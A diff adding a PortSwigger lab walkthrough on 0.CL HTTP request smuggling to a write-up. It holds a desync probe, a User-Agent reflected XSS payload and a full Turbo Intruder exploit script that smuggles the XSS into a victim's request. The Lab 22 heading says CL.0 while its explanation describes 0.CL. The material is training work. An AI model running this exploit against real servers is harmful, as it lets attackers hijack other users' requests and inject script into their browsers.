@@ -20,6 +20,10 @@ This lab covers client-side desynchronization attacks that occur when inconsiste
 **Server-side pause-based request smuggling**  
 This lab demonstrates advanced request smuggling using deliberate pauses to manipulate server request parsing behavior.
 
+**Server-side CL.0 request smuggling**
+
+This lab demonstrates request smuggling vulnerabilities caused by inconsistent handling of the `Content-Length` header. The front-end server honors the header while the back-end server ignores it for specific endpoints, allowing an attacker to smuggle requests and gain unauthorized access to the admin panel.
+
 ---
 
 ### LAB 16 - Exploiting HTTP request smuggling to perform web cache poisoning
@@ -594,8 +598,10 @@ In Turbo Intruder, go back to the attack configuration screen. In your smuggled 
 
 Study the response and observe that the admin panel contains an HTML form for deleting a given user. Make a note of the following details:
 
- • The action attribute (/admin/delete).
+    • The action attribute (/admin/delete).
+	
 	• The name of the input (username).
+	
 	• The csrf token
 
 <img width="1868" height="904" alt="image" src="https://github.com/user-attachments/assets/e0e85ec0-f6f7-49b2-b10c-87a7e482f8ea" />
@@ -644,5 +650,178 @@ After 61 seconds, the lab is solved.
 lab is solved.
 
 <img width="1761" height="557" alt="image" src="https://github.com/user-attachments/assets/13e4df40-dc55-4cfd-a1ce-1b839a17ec0f" />
+
+---
+
+### LAB 22 - CL.0 request smuggling
+
+### Lab Description
+
+<img width="1106" height="554" alt="image" src="https://github.com/user-attachments/assets/bc679ceb-902d-405c-a9e2-cf7a962fc2de" />
+
+### Solution
+
+
+### Beginner-Friendly Explanation: 0.CL Request Smuggling
+
+#### Simple Analogy
+Imagine two people processing a multi-page letter:
+
+- The first person (front-end server) sees "End of letter" followed by `Content-Length: 0` on the first page. They think the letter is finished and forward any remaining pages without reading them.
+- The second person (back-end server) ignores that and sees extra content with `Content-Length: 4`. They treat the next page as a completely new, separate letter.
+
+If an attacker hides malicious instructions on that "extra" page, the back-end will process them as a legitimate new request. This is **0.CL request smuggling** — a desynchronization attack where the front-end and back-end disagree on request boundaries due to how they handle `Content-Length: 0`.
+
+(For deeper details, see James Kettle's research: [HTTP/1.1 Must Die](https://portswigger.net/research/http1-must-die).)
+
+### Initial Reconnaissance in Burp Suite
+1. Configure your browser to proxy through Burp Suite and access the lab.
+2. Browse the homepage and several static pages, capturing all requests in the HTTP history.
+3. Examine responses for unusual headers, particularly `Content-Length` and `Transfer-Encoding`.
+
+### Confirming 0.CL Desync Behavior
+Before crafting a full exploit, verify that the back-end processes smuggled content when `Content-Length: 0` is used.
+
+**Manual Test in Repeater (Grouped Tabs):**
+1. Create this combined request:
+   ```
+   POST / HTTP/1.1
+   Host: <LAB_HOST>
+
+   GET /404 HTTP/1.1
+   Host: <LAB_HOST>
+   ```
+   (Note: No body after the empty POST; the GET follows directly.)
+2. Send the full payload.
+3. If the back-end processes the `GET /404` (e.g., returns 404 or anomalous behavior), 0.CL desync is confirmed.
+
+<img width="1088" height="318" alt="image" src="https://github.com/user-attachments/assets/9b3bba37-bd4c-4a8e-b009-f26ca73c9760" />
+
+This step ensures the back-end treats appended content as a new request — crucial before proceeding.
+
+**Finding the XSS Vulnerability**  
+During scanning, an informational issue like "User agent-dependent response" may appear. 
+
+<img width="989" height="396" alt="image" src="https://github.com/user-attachments/assets/7853633e-fe58-451d-99f4-cf28b1f75805" />
+
+Perform a targeted active scan on the `User-Agent` header insertion point. This quickly reveals reflected XSS in requests to `/post?postId=8`, where the `User-Agent` value is echoed unsafely.
+
+<img width="940" height="425" alt="image" src="https://github.com/user-attachments/assets/d5e39ac5-f942-47eb-b227-9ef4025722da" />
+
+
+### Exploiting 0.CL Request Smuggling
+Manual exploitation is unreliable due to timing and double-desync requirements. Use **Turbo Intruder** with James Kettle's template script for reliability.
+
+1. Send a fresh `GET /` request to Turbo Intruder.
+
+<img width="940" height="344" alt="image" src="https://github.com/user-attachments/assets/0d8f1965-b887-40e8-8125-86b51bb162be" />
+
+2. Load the example script: `examples/0cl-exploit.py`.
+
+<img width="798" height="58" alt="image" src="https://github.com/user-attachments/assets/e04f3089-b748-47f4-bbb6-9f22ff82aa39" />
+
+**Key Customizations (Tailored for This Lab):**
+- **Early Response Gadget (stage1):** Use a static resource path for stability:
+  ```
+  POST /resources/css/anything HTTP/1.1
+  Host: '''+host+'''
+  Content-Type: application/x-www-form-urlencoded
+  Connection: keep-alive
+  Content-Length : %s
+  
+  ```
+  (Subpaths like `/resources/css/` often work better than root paths.)
+
+- **Smuggled Payload (containing XSS):**
+  ```
+  GET /post?postId=8 HTTP/1.1
+  User-Agent: a"/><script>alert(1)</script>
+  Content-Type: application/x-www-form-urlencoded
+  Content-Length: 5
+  
+  x=1
+  ```
+
+- **stage2_chopped (to maintain connection state):**
+  Some servers reject bodiless GETs, so use a method like OPTIONS:
+  ```
+  OPTIONS / HTTP/1.1
+  Content-Length: 123
+  X: Y
+  ```
+
+- **Optional Auto-Stop on Success:**
+  ```
+  if req.label == 'victim' and 'Congratulations' in req.response:
+      req.engine.cancel()
+  ```
+
+### Full Customized Turbo Intruder Script
+```python
+# Based on https://portswigger.net/research/http1-must-die
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=10,
+                           requestsPerConnection=1,
+                           engine=Engine.BURP,
+                           maxRetriesPerRequest=0,
+                           timeout=15
+                           )
+
+    stage1 = '''POST /resources/css/anything HTTP/1.1
+Host: '''+host+'''
+Content-Type: application/x-www-form-urlencoded
+Connection: keep-alive
+Content-Length : %s
+
+'''
+
+    smuggled = '''GET /post?postId=8 HTTP/1.1
+User-Agent: a"/><script>alert(1)</script>
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 5
+
+x=1'''
+
+    stage2_chopped = '''OPTIONS / HTTP/1.1
+Content-Length: 123
+X: Y'''
+
+    stage2_revealed = '''GET /404 HTTP/1.1
+Host: '''+host+'''
+User-Agent: foo
+Content-Type: application/x-www-form-urlencoded
+Connection: keep-alive
+'''
+
+    victim = '''GET / HTTP/1.1
+Host: '''+host+'''
+User-Agent: foo
+'''
+
+    # Do not edit below this line
+    if '%s' not in stage1:
+        raise Exception('Please place %s in the Content-Length header value')
+    if not stage1.endswith('\r\n\r\n'):
+        raise Exception('Stage1 request must end with a blank line and have no body')
+
+    while True:
+        engine.queue(stage1, len(stage2_chopped), label='stage1', fixContentLength=False)
+        engine.queue(stage2_chopped + stage2_revealed + smuggled, label='stage2')
+        engine.queue(victim, label='victim')
+
+def handleResponse(req, interesting):
+    table.add(req)
+    # Double-desync attacks can take time!
+    if req.label == 'victim' and 'Congratulations' in req.response:
+        req.engine.cancel()
+```
+
+<img width="720" height="460" alt="image" src="https://github.com/user-attachments/assets/083114ef-84ed-4afd-8831-e3718d20333c" />
+
+
+Launch the attack. It typically solves the lab in seconds to a minute by smuggling the XSS payload into the victim's (Carlos's) homepage request, triggering `alert(1)` in their browser.
+
+ <img width="940" height="392" alt="image" src="https://github.com/user-attachments/assets/069281d0-0f91-4683-bbdf-4f13ab46e7c9" />
 
 ---
